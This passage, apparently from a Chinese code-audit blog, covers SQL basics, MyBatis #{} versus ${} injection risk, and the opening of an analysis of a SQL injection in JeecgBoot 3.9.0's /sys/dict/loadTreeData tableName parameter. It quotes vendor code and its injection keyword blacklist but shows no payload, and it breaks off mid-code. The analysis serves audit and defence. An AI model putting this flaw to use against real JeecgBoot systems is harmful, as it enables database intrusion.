</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">INSERT</span> <span style="color:#ff79c6">INTO</span> users (username, password) <span style="color:#ff79c6">VALUES</span> (<span style="color:#f1fa8c">&#39;user1&#39;</span>, <span style="color:#f1fa8c">&#39;pass1&#39;</span>), (<span style="color:#f1fa8c">&#39;user2&#39;</span>, <span style="color:#f1fa8c">&#39;pass2&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 更新数据 (UPDATE) 注意：一定要带 WHERE 条件，否则会更新整张表
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 更新特定用户的密码
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">UPDATE</span> users <span style="color:#ff79c6">SET</span> password <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;new_password&#39;</span> <span style="color:#ff79c6">WHERE</span> id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 同时更新多个字段
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">UPDATE</span> users <span style="color:#ff79c6">SET</span> status <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>, update_time <span style="color:#ff79c6">=</span> NOW() <span style="color:#ff79c6">WHERE</span> username <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;admin&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 删除数据 (DELETE) 注意：一定要带 WHERE 条件，否则会清空整张表
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 删除特定 ID 的记录
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">DELETE</span> <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">WHERE</span> id <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">5</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">-- 删除状态为禁用的用户
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">DELETE</span> <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">WHERE</span> status <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="mybatis框架">Mybatis框架<a class="anchor" href="#mybatis%e6%a1%86%e6%9e%b6">#</a></h2>
<ul>
<li>#{} 用于预编译的 SQL 语句中，是预编译处理（安全）。</li>
<li>${} 则用于动态 SQL 语句中，是直接字符串替换（危险），字符串拼接。</li>
</ul>
<h2 id="mybatis-plus框架">Mybatis Plus框架<a class="anchor" href="#mybatis-plus%e6%a1%86%e6%9e%b6">#</a></h2>
<p>审计MyBatis Plus框架中的SQL注入问题，核心在于识别动态SQL拼接的场景。</p>
<p>在 MyBatis/MyBatis Plus 中，MyBatis Plus 完全兼容 MyBatis的语法：</p>
<ul>
<li>#{} 用于预编译的 SQL 语句中，是预编译处理（安全）。</li>
<li>${} 则用于动态 SQL 语句中，是直接字符串替换（危险），字符串拼接。</li>
</ul>
<p>语法：</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;mapper</span> <span style="color:#50fa7b">namespace=</span><span style="color:#f1fa8c">&#34;com.example.mapper.UserMapper&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">&lt;!-- 增加：useGeneratedKeys 获取自增主键 --&gt;</span>
</span></span><span style="display:flex;"><span>        INSERT INTO users (name, email) VALUES (#{name}, #{email})
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/insert&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">&lt;!-- 删除 --&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;delete</span> <span style="color:#50fa7b">id=</span><span style="color:#f1fa8c">&#34;deleteUserById&#34;</span> <span style="color:#50fa7b">parameterType=</span><span style="color:#f1fa8c">&#34;int&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        DELETE FROM users WHERE id = #{id}
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/delete&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">&lt;!-- 修改 --&gt;</span>
</span></span><span style="display:flex;"><span>        UPDATE users SET name = #{name}, email = #{email} WHERE id = #{id}
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/update&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">&lt;!-- 查询：resultType 指定返回类型 --&gt;</span>
</span></span><span style="display:flex;"><span>        SELECT * FROM users WHERE id = #{id}
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/select&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/mapper&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="jeecgboot-390-sysdictloadtreedata--tablename参数sql-注入"><strong>JeecgBoot 3.9.0 /sys/dict/loadTreeData  tableName参数SQL 注入</strong><a class="anchor" href="#jeecgboot-390-sysdictloadtreedata--tablename%e5%8f%82%e6%95%b0sql-%e6%b3%a8%e5%85%a5">#</a></h3>
<ol>
<li>SysDictController.java ， loadTreeData 接口直接接收了前端传来的 tableName 参数。</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6272a4">/**
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	 * 查询数据 查出所有部门,并以树结构数据格式响应给前端
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	 * 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	 * @return
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">	 */</span>
</span></span><span style="display:flex;"><span>	@RequestMapping(value <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/queryTreeList&#34;</span>, method <span style="color:#ff79c6">=</span> RequestMethod.<span style="color:#50fa7b">GET</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">public</span> Result<span style="color:#ff79c6">&lt;</span>List<span style="color:#ff79c6">&lt;</span>SysDepartTreeModel<span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#50fa7b">queryTreeList</span>(@RequestParam(name <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;ids&#34;</span>, required <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">false</span>) String ids) {
</span></span><span style="display:flex;"><span>		Result<span style="color:#ff79c6">&lt;</span>List<span style="color:#ff79c6">&lt;</span>SysDepartTreeModel<span style="color:#ff79c6">&gt;&gt;</span> result <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Result<span style="color:#ff79c6">&lt;&gt;</span>();
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#6272a4">// 从内存中读取</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//			List&lt;SysDepartTreeModel&gt; list =FindsDepartsChildrenUtil.getSysDepartTreeList();</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//			if (CollectionUtils.isEmpty(list)) {</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//				list = sysDepartService.queryTreeList();</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//			}</span>
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span>(oConvertUtils.<span style="color:#50fa7b">isNotEmpty</span>(ids)){
</span></span><span style="display:flex;"><span>				List<span style="color:#ff79c6">&lt;</span>SysDepartTreeModel<span style="color:#ff79c6">&gt;</span> departList <span style="color:#ff79c6">=</span> sysDepartService.<span style="color:#50fa7b">queryTreeList</span>(ids);
</span></span><span style="display:flex;"><span>				result.<span style="color:#50fa7b">setResult</span>(departList);
</span></span><span style="display:flex;"><span>			}<span style="color:#ff79c6">else</span>{
</span></span><span style="display:flex;"><span>				List<span style="color:#ff79c6">&lt;</span>SysDepartTreeModel<span style="color:#ff79c6">&gt;</span> list <span style="color:#ff79c6">=</span> sysDepartService.<span style="color:#50fa7b">queryTreeList</span>();
</span></span><span style="display:flex;"><span>				result.<span style="color:#50fa7b">setResult</span>(list);
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			result.<span style="color:#50fa7b">setSuccess</span>(<span style="color:#ff79c6">true</span>);
</span></span><span style="display:flex;"><span>		} <span style="color:#ff79c6">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>			log.<span style="color:#50fa7b">error</span>(e.<span style="color:#50fa7b">getMessage</span>(),e);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>	}</span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>
<p>处理 (Service 层) 在 SysDictServiceImpl.java 的 queryTreeList 方法中</p>
<p>有一段逻辑专门用来分隔 tableName ：<code>String[] arr = table.split(&quot; (?i)where &quot;);</code></p>
<p>由于一系列操作导致注入语句可以被赋值给filterSql：<code>filterSql = oConvertUtils.getString(arr[1], null)；</code></p>
<p>然后会进行SQL检测：<code>SqlInjectionUtil.specialFilterContentForDictSql(filterSql);</code></p>
<p><code> private static String specialDictSqlXssStr = &quot;exec |peformance_schema|information_schema|extractvalue|updatexml|geohash|gtid_subset|gtid_subtract|insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |;|+|--&quot;;</code></p>
<p>这个filterSql又被放入：queryParams Map中<code>queryParams.put(&quot;_tableFilterSql&quot;, filterSql);</code></p>
</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>	@Override
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">public</span> List<span style="color:#ff79c6">&lt;</span>TreeSelectModel<span style="color:#ff79c6">&gt;</span> <span style="color:#50fa7b">queryTreeList</span>(Map<span style="color:#ff79c6">&lt;</span>String, String<span style="color:#ff79c6">&gt;</span> query, String table, String text, String code, String pidField, String pid, String hasChildField, <span style="color:#8be9fd">int</span> converIsLeafVal) {
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">//为了防止sql（jeecg提供了防注入的方法，可以在拼接 SQL 语句时自动对参数进行转义，避免SQL注入攻击）</span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// 1.针对采用 ${}写法的表名和字段进行转义和check</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//update-begin---author:chenrui ---date:20251015  for：[QQYUN-13741]【客户问题 南自】online表单自定义树 表后边加条件时 不生效------------</span>
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// 分割SQL获取表名和条件</span>
</span></span><span style="display:flex;"><span>        String filterSql <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span>(table.<span style="color:#50fa7b">toLowerCase</span>().<span style="color:#50fa7b">indexOf</span>(DataBaseConstant.<span style="color:#50fa7b">SQL_WHERE</span>)<span style="color:#ff79c6">&gt;</span>0){
</span></span><span style="display:flex;"><span>            String<span style="color:#ff79c6">[]</span> arr <span style="color:#ff79c6">=</span> table.<span style="color:#50fa7b">split</span>(<span style="color:#f1fa8c">&#34; (?i)where &#34;</span>);
</span></span><span style="display:flex;"><span>            table <span style="color:#ff79c6">=</span> arr<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]</span>;
</span></span><span style="display:flex;"><span>            filterSql <span style="color:#ff79c6">=</span> oConvertUtils.<span style="color:#50fa7b">getString</span>(arr<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>, <span style="color:#ff79c6">null</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        table <span style="color:#ff79c6">=</span> SqlInjectionUtil.<span style="color:#50fa7b">getSqlInjectTableName</span>(table);
</span></span><span style="display:flex;"><span>		text <span style="color:#ff79c6">=</span> SqlInjectionUtil.<span style="color:#50fa7b">getSqlInjectField</span>(text);
</span></span><span style="display:flex;"><span>		code <span style="color:#ff79c6">=</span> SqlInjectionUtil.<span style="color:#50fa7b">getSqlInjectField</span>(code);
</span></span><span style="display:flex;"><span>		pidField <span style="color:#ff79c6">=</span> SqlInjectionUtil.<span style="color:#50fa7b">getSqlInjectField</span>(pidField);
</span></span><span style="display:flex;"><span>		hasChildField <span style="color:#ff79c6">=</span> SqlInjectionUtil.<span style="color:#50fa7b">getSqlInjectField</span>(hasChildField);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span>(oConvertUtils.<span style="color:#50fa7b">isEmpty</span>(text) <span style="color:#ff79c6">||</span> oConvertUtils.<span style="color:#50fa7b">isEmpty</span>(code)){
</span></span><span style="display:flex;"><span>			log.<span style="color:#50fa7b">warn</span>(<span style="color:#f1fa8c">&#34;text={}，code={}&#34;</span>, text, code);
</span></span><span style="display:flex;"><span>			log.<span style="color:#50fa7b">warn</span>(<span style="color:#f1fa8c">&#34;加载树字典参数有误，text和code不允许为空！&#34;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// 2.检测最终SQL是否存在SQL注入风险</span>
</span></span><span style="display:flex;"><span>		String dictCode <span style="color:#ff79c6">=</span> table <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;,&#34;</span> <span style="color:#ff79c6">+</span> text <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;,&#34;</span> <span style="color:#ff79c6">+</span> code;
</span></span><span style="display:flex;"><span>		SqlInjectionUtil.<span style="color:#50fa7b">filterContentMulti</span>(dictCode);
</span></span><span style="display:flex;"><span>        SqlInjectionUtil.<span style="color:#50fa7b">specialFilterContentForDictSql</span>(filterSql);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// 【QQYUN-6533】表字典白名单check</span>
</span></span><span style="display:flex;"><span>		sysBaseAPI.<span style="color:#50fa7b">dictTableWhiteListCheckByDict</span>(table, text, code);
</span></span><span style="display:flex;"><span>		<span style="color:#6272a4">// 3.表字典SQL表名黑名单 Check</span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">!</span>dictQueryBlackListHandler.<span style="color:#50fa7b">isPass</span>(dictCode)){
</span></span><span style="display:flex;"><span>			log.<span style="color:#50fa7b">error</span>(<span style="color:#f1fa8c">&#34;Sql异常：{}&#34;</span>, dictQueryBlackListHandler.<span style="color:#50fa7b">getError</span>());
